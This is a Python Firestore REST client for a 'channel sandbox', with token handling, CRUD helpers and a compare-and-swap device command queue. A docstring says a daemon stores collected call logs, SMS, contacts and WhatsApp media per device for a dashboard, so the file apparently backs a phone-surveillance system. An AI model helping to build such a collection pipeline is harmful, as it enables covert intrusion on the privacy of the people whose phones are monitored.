#!/usr/bin/env python3
"""Small Firestore REST client used by the channel sandbox."""
from __future__ import annotations

import logging
import threading
import time
from datetime import timezone
from typing import Mapping
from urllib.parse import quote

import requests
from google.auth.transport.requests import Request
from google.oauth2 import service_account

log = logging.getLogger("channel_sandbox.firestore")


class FirestoreClient:
    def __init__(
        self,
        project,
        database,
        service_account_key,
        scope,
        mode="emulator",
        collection=None,
        emulator_host="127.0.0.1:8080",
        allow_production_devices=False,
        service_account_info=None,
    ):
        if mode not in {"emulator", "real"}:
            raise ValueError(f"unsupported Firestore mode: {mode}")
        if mode == "real" and collection == "devices" and not allow_production_devices:
            raise ValueError(
                "real mode may not target the production devices collection "
                "without allow_production_devices=True"
            )
        if mode == "emulator" and not emulator_host:
            raise ValueError("emulator mode requires emulator_host")

        self.project = project
        self.database = database
        self.scope = scope
        self.mode = mode
        self.collection = collection
        self.emulator_host = emulator_host
        self._lock = threading.Lock()
        self._token = None
        self._token_expiry = 0.0
        self._creds = None
        if mode == "real":
            if service_account_info is not None:
                # Serverless hosts have no key file on disk, so the credential
                # arrives as a parsed JSON object from the environment instead.
                self._creds = service_account.Credentials.from_service_account_info(
                    service_account_info, scopes=[scope]
                )
            else:
                self._creds = service_account.Credentials.from_service_account_file(
                    service_account_key, scopes=[scope]
                )

    def _ensure_token(self):
        if self.mode == "emulator":
            return "owner"
        with self._lock:
            now = time.time()
            if self._token is None or now >= self._token_expiry - 60:
                self._creds.refresh(Request())
                self._token = self._creds.token
                expiry = self._creds.expiry
                self._token_expiry = (
                    (
                        expiry.replace(tzinfo=timezone.utc)
                        if expiry.tzinfo is None
                        else expiry.astimezone(timezone.utc)
                    ).timestamp()
                    if expiry
                    else now + 3500
                )
            token = self._token
        return token

    def _base(self):
        project = quote(self.project, safe="")
        database = quote(self.database, safe="")
        if self.mode == "emulator":
            return (
                f"http://{self.emulator_host}/v1/projects/{project}"
                f"/databases/{database}/documents"
            )
        return (
            f"https://firestore.googleapis.com/v1/projects/{project}"
            f"/databases/{database}/documents"
        )

    def _headers(self):
        return {
            "Authorization": "Bearer " + self._ensure_token(),
            "Content-Type": "application/json",
        }

    def _request(self, method, path, body=None, params=None):
        url = self._base() + path
        last_exc = None
        last_resp = None
        for attempt in range(3):
            try:
                resp = requests.request(
                    method,
                    url,
                    headers=self._headers(),
                    params=params,
                    json=body,
                    timeout=15,
                )
                if resp.status_code == 401:
                    last_resp = resp
                    with self._lock:
                        self._token = None
                        self._token_expiry = 0.0
                    continue
                return resp
            except requests.RequestException as exc:
                last_exc = exc
                log.warning("request error attempt %s: %s", attempt + 1, exc)
                time.sleep(0.5 * (attempt + 1))
        if last_exc is not None:
            raise last_exc
        if last_resp is not None:
            return last_resp
        raise RuntimeError("Firestore request made no attempts")

    @staticmethod
    def _path(collection, doc_id):
        return f"/{quote(collection, safe='')}/{quote(doc_id, safe='')}"

    def get_doc(self, collection, doc_id, fields=None):
        params = [("mask.fieldPaths", field) for field in fields] if fields else None
        resp = self._request("GET", self._path(collection, doc_id), params=params)
        if resp.status_code == 404:
            return None
        resp.raise_for_status()
        return resp.json()

    def list_docs(self, collection, doc_id, subcollection, limit=50):
        """List documents in a device subcollection, newest first.

        The S24 daemon persists collected records (callLogs, sms, contacts,
        whatsappMedia) as subcollection documents under the device document,
        so the dashboard reads them through this path.
        """
        path = (
            f"/{quote(collection, safe='')}/{quote(doc_id, safe='')}"
            f"/{quote(subcollection, safe='')}"
        )
        resp = self._request("GET", path, params=[("pageSize", str(limit))])
        if resp.status_code == 404:
            return []
        resp.raise_for_status()
        docs = resp.json().get("documents", [])
        out = []
        for doc in docs:
            fields = doc.get("fields", {})
            out.append({"id": doc.get("name", "").rsplit("/", 1)[-1], **decode_fields(fields)})
        return out

    def set_doc(
        self,
        collection,
        doc_id,
        fields,
        merge=True,
        precondition_update_time=None,
    ):
        params = None
        if merge and fields:
            top_levels = list(dict.fromkeys(key.split(".", 1)[0] for key in fields))
            params = [("updateMask.fieldPaths", top) for top in top_levels]
            body = {"fields": _encode_fields_with_paths(fields)}
        else:
            body = {"fields": _encode_fields(fields)}
        if precondition_update_time:
            params = list(params or [])
            params.append(("currentDocument.updateTime", precondition_update_time))
        resp = self._request(
            "PATCH", self._path(collection, doc_id), body=body, params=params
        )
        resp.raise_for_status()
        return resp.json()

    def delete_doc(self, collection, doc_id):
        resp = self._request("DELETE", self._path(collection, doc_id))
        if resp.status_code not in (200, 404):
            resp.raise_for_status()

    def update_command_queue(self, collection, doc_id, cmd_id, entry_fields):
        return self.update_command_queue_entries(
            collection, doc_id, {cmd_id: entry_fields}
        )

    def update_command_queue_entries(
        self, collection, doc_id, entries, max_attempts=3
    ):
        """Merge command subfields without losing siblings, using updateTime CAS.

        The emulator's PATCH gateway does not honor updateTime preconditions, but
        the Firestore commit endpoint does. Using commit also matches production
        precondition semantics while retaining the same one-write update.
        """
        last_resp = None
        for attempt in range(max_attempts):
            current = self.get_doc(collection, doc_id)
            existing = (
                current.get("fields", {})
                .get("commandQueue", {})
                .get("mapValue", {})
                .get("fields", {})
                if current
                else {}
            )
            merged_queue = dict(existing)
            for cmd_id, new_fields in entries.items():
                encoded_existing = (
                    existing.get(cmd_id, {}).get("mapValue", {}).get("fields", {})
                )
                merged_entry = dict(encoded_existing)
                merged_entry.update(_encode_fields(new_fields))
                merged_queue[cmd_id] = {"mapValue": {"fields": merged_entry}}

            name = (
                current["name"]
                if current
                else (
                    f"projects/{self.project}/databases/{self.database}/documents/"
                    f"{collection}/{doc_id}"
                )
            )
            precondition = {}
            if current and current.get("updateTime"):
                precondition["updateTime"] = current["updateTime"]
            elif current is None:
                precondition["exists"] = False
            body = {"writes": [{
                "update": {
                    "name": name,
                    "fields": {
                        "commandQueue": {"mapValue": {"fields": merged_queue}}
                    },
                },
                "updateMask": {"fieldPaths": ["commandQueue"]},
                "currentDocument": precondition,
            }]}
            resp = self._request(
                "POST",
                ":commit",
                body=body,
            )
            conflict = resp.status_code == 412
            if resp.status_code == 400:
                try:
                    conflict = (
                        resp.json().get("error", {}).get("status")
                        == "FAILED_PRECONDITION"
                    )
                except ValueError:
                    conflict = False
            if conflict:
                last_resp = resp
                log.warning(
                    "commandQueue CAS conflict on attempt %s/%s",
                    attempt + 1,
                    max_attempts,
                )
                continue
            resp.raise_for_status()
            return resp.json()
        raise requests.HTTPError(
            f"commandQueue CAS failed after {max_attempts} attempts",
            response=last_resp,
        )


def decode_fields(fields):
    return decode_value({"mapValue": {"fields": fields}})


def decode_value(value_obj):
    """Decode a Firestore value object into a plain Python value."""
    if not isinstance(value_obj, Mapping):
        return None
    if "stringValue" in value_obj:
        return value_obj["stringValue"]
    if "booleanValue" in value_obj:
        return value_obj["booleanValue"]
    if "integerValue" in value_obj:
        return int(value_obj["integerValue"])
    if "doubleValue" in value_obj:
        return float(value_obj["doubleValue"])
    if "nullValue" in value_obj:
        return None
    if "timestampValue" in value_obj:
        return value_obj["timestampValue"]
    if "bytesValue" in value_obj:
        return value_obj["bytesValue"]
    if "referenceValue" in value_obj:
        return value_obj["referenceValue"]
    if "geoPointValue" in value_obj:
        return dict(value_obj["geoPointValue"])
    if "arrayValue" in value_obj:
        return [decode_value(v) for v in value_obj["arrayValue"].get("values", [])]
    if "mapValue" in value_obj:
        return {
            key: decode_value(value)
            for key, value in value_obj["mapValue"].get("fields", {}).items()
        }
    return None


def _encode_value(value):
    if value is None:
        return {"nullValue": None}
    if isinstance(value, bool):
        return {"booleanValue": value}
    if isinstance(value, int):
        return {"integerValue": str(value)}
    if isinstance(value, float):
        return {"doubleValue": value}
    if isinstance(value, str):
        return {"stringValue": value}
    if isinstance(value, (list, tuple)):
        return {"arrayValue": {"values": [_encode_value(item) for item in value]}}
    if isinstance(value, Mapping):
        return {"mapValue": {"fields": _encode_fields(dict(value))}}
    raise TypeError(f"unsupported Firestore value type: {type(value).__name__}")


def _encode_fields(mapping):
    return {key: _encode_value(value) for key, value in mapping.items()}


def _encode_fields_with_paths(mapping):
    nested = {}
    for key, value in mapping.items():
        parts = key.split(".")
        cursor = nested
        for part in parts[:-1]:
            cursor.setdefault(part, {"mapValue": {"fields": {}}})
            cursor = cursor[part]["mapValue"]["fields"]
        cursor[parts[-1]] = _encode_value(value)
    return nested
